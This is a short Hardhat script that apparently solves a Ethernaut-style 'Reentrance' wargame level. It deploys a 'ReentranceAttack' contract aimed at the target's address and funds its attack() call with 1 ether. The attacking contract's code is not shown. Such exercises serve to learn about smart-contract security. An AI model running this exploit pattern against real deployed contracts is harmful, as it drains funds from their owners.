import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xB5d064b44960FdedA1072f983C3E8f1e123cE154"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Reentrance", CONTRACT_ADDRESS, signer)
    const _provider = contract.provider;

    const ReentranceAttack = await ethers.getContractFactory("ReentranceAttack", signer)
    const reentranceAttack = await ReentranceAttack.deploy(CONTRACT_ADDRESS)
    await reentranceAttack.deployed()

    await reentranceAttack.attack({
        value: ethers.utils.parseEther("1"),
    })
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});